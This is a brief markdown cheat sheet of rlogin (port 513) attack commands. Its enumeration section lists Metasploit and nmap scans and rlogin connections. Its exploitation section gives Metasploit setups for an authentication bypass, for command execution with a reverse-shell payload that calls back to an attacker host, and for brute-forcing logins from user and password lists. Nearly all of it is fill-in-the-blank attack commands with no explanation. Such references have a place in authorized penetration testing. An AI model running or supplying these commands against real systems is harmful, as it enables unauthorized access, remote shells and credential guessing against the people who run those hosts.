# Rlogin

## Enumeration

### Metasploit

##### rlogin_version
```bash
use auxiliary/scanner/rlogin/rlogin_version
set RHOSTS [IP]
set RPORT 513
run
```

### Nmap

##### nmap (RLogin service detection)
```bash
nmap -p 513 --script=rlogin-banner [IP]
```

##### nmap (RLogin enumeration)
```bash
nmap -p 513 --script=rlogin-enum [IP]
```

### rlogin

##### rlogin (Connect to RLogin)
```bash
rlogin [IP] -l [USER]
```

##### rlogin (Verbose connection attempt)
```bash
rlogin -v [IP] -l [USER]
```


---
---


## Exploitation

### Metasploit

##### rlogin_auth_bypass
```bash
use exploit/unix/rlogin/rlogin_auth_bypass
set RHOSTS [IP]
set RPORT 513
set USERNAME [username]
set PASSWORD [password]
run
```

##### rlogin_command_exec
```bash
use exploit/unix/rlogin/rlogin_command_exec
set RHOSTS [IP]
set RPORT 513
set USERNAME [username]
set PASSWORD [password]
set PAYLOAD unix/reverse
set LHOST [IP]
set LPORT [port]
run
```

##### rlogin_brute
```bash
use auxiliary/scanner/rlogin/rlogin_brute
set RHOSTS [IP]
set RPORT 513
set USER_FILE [userlist.txt]
set PASS_FILE [passwordlist.txt]
run
```